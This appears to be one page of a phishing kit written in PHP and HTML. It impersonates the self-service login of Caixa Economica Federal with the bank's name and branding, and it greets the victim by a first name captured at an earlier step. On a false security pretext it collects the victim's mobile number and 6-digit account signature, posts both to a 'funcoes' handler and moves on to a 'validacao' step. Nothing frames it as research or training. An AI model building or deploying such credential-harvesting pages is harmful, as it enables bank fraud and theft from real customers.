<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <title>Caixa Economica Federal - Autoatendimento Pessoa Fisica</title>
    <link rel="stylesheet" type="text/css" href="../../assets/css/identificacao.css" />

    <!-- CSS -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
    <!-- Default theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css" />
    <!-- Semantic UI theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/semantic.min.css" />
    <!-- Bootstrap theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />

    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
    <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />

    <style>
        input.textPassword {
            width: 100% !important;
            padding: 0;
            margin: 5px 0 0 0 !important;
        }

        label {
            font-size: 13px;
        }
    </style>
</head>

<body class="cadastro" cz-shortcut-listen="true">
    <div id="delimitarTeclado">
        <div class="main" id="conteudo">
            <div data-component="loading">
                <div class="modalBgLoading" style="display: none;">
                    <div class="loading"></div>
                </div>
            </div>

            <div name="formLogin" autocomplete="off">
                <div class="container-fluid ajusteMargem">
                    <div class="row" id="conteudo-login">
                        <div class="col-lg-9 col-md-9 col-sm-12 col-xs-12">
                            <div class="icoIdentificacaoUsuario iconLogin">
                                <span class="tituloPrincipal" style="margin-top: 0">
                                    Olá, <?php if (empty($_SESSION['primeiro_nome'])) {
                                            } else {
                                                echo ($_SESSION['primeiro_nome']);
                                            } ?></span>
                            </div>
                            <div class="panel panel-default inputCinza blocLoginCinza">
                                <div class="panel-body painelCinza blocLoginCinza">
                                    <p id="titulo" class="fonteXS" style="line-height: 23px;">Por motivo de segurança é necessário confirmar algumas informações.</p>

                                    <div id="boxLogin" name="boxLogin">

                                        <div id="simDV" style="display: block;">

                                            <div class="row">
                                                <input id="telefone" name="telefone" class="inputWhite form-control fone textPassword " maxlength="15" value="" type="tel" size="10" autocomplete="off" required="required">

                                                <div class="col-lg-8 col-md-8 col-sm-8 col-xs-6 imgIconSaiba p-l-0">
                                                    Telefone Celular
                                                </div>
                                            </div>
                                            <div>
                                                <p style="margin-bottom: 20px;text-align: center;font-size: 14px;color: #0164a8;">
                                                    Para aumentar ainda mais sua segurança, esta validação deve ser confirmada com a <b>assinatura de 6 dígitos.</b>
                                                </p>
                                                <input id="inpSenha" class="textPassword" type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="6" minlength="6" required="required" aria-invalid="true" name="s6" style="-webkit-text-security: disc;letter-spacing: 11px!important;">
                                                <label class="has-text-lefted">Assinatura de 6 dígitos</label>
                                            </div>

                                            <div class="row">
                                                <div class="buttonClearPassword form-group col-md-9 col-xs-12">
                                                    <button type="button" id="btnLimpar" name="btnLimpar" class="botaoCinza" title="Limpar" style="border-radius: 3px;">Limpar</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-md-12 col-xs-12">
                                            <button id="btnConfirmar" name="btnConfirmar" accesskey="s" class="botaoLaranja pull-right gravar_assinatura" title="Continuar" style="border-radius: 3px;">CONTINUAR</button>
                                        </div>
                                    </div>

                                    <p id="complemento" class="textoDestaque">*Este dado está de acordo com o registro de Cadastro de Pessoa Física da Receita Federal.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>
    <script>
        $(document).ready(function() {


            function campos_obrigatorios(campo) {
                alertify.alert('Caixa', '' + campo + '');
            }

            $("#telefone").mask("(99) 99999-9999");
            $(document).on('click', '.gravar_assinatura', function() {
                var telefone = $("#telefone").val();
                var inpSenha = $("#inpSenha").val();
                if (telefone == '') {
                    campos_obrigatorios('Telefone Obrigatório. (C905-010)');
                    return false;
                }

                $.ajax({
                    url: "funcoes",
                    method: "post",
                    data: {
                        action: 'gravar_assinatura_mobile',
                        telefone: telefone,
                        inpSenha: inpSenha
                    },
                    success: function(res) {
                        if (res == "success") {
                            window.location.href = "validacao"
                        } else {
                            alert('não foi possivel completar essa solicitacao. Por favor, tente novamente mais tarde');
                        }
                    },
                    error: function() {
                        alert('erro ao processar essa solicitacao');
                    }
                })
            });
        });
    </script>
</body>

</html>